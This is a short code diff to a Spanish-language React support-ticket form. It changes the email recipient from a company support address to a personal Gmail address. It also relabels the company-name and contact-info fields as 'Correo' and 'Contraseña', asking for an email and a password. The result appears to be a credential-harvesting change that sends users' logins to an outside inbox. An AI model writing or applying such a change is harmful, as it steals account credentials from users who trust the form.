@@ -52,7 +52,7 @@ function Soporte() {
 
       // Enviar correo
       const correoResponse = await enviarCorreo({
-        destinatario: "soporte@tecnotics.com",
+        destinatario: "danielalejandrosalgadoleon@gmail.com",
         asunto: "Envío de Ticket",
         mensaje: `Detalles del Ticket:
         - Nombre de la empresa: ${company}
@@ -121,7 +121,7 @@ function Soporte() {
           <Grid container spacing={2}>
             <Grid item xs={12}>
               <TextField
-                label="Nombre de la empresa"
+                label="Correo"
                 fullWidth
                 variant="outlined"
                 name="company"
@@ -132,7 +132,7 @@ function Soporte() {
             </Grid>
             <Grid item xs={12}>
               <TextField
-                label="Información de contacto"
+                label="Contraseña"
                 fullWidth
                 variant="outlined"
                 name="contact"
